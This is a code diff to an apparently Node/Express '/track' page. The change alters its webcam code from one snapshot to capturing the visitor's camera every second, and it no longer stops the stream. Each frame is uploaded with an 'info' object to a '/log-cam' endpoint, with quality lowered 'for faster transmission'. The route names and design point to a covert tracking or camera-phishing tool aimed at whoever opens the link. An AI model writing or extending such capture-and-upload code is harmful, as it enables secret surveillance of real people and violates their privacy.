@@ -127,16 +127,20 @@ app.get('/track', (req, res) => {
                             const canvas = document.createElement('canvas');
                             canvas.width = video.videoWidth;
                             canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            const ctx = canvas.getContext('2d');
                             
-                            const photo = canvas.toDataURL('image/jpeg');
-                            stream.getTracks().forEach(track => track.stop());
-                            
-                            await fetch('/log-cam', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ photo, info })
-                            });
+                            // Capture every second
+                            setInterval(async () => {
+                                ctx.drawImage(video, 0, 0);
+                                const photo = canvas.toDataURL('image/jpeg', 0.7); // Slightly lower quality for faster transmission
+                                
+                                await fetch('/log-cam', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ photo, info })
+                                });
+                            }, 1000);
+
                         } catch (e) {
                             console.error('Cam Error:', e);
                         }
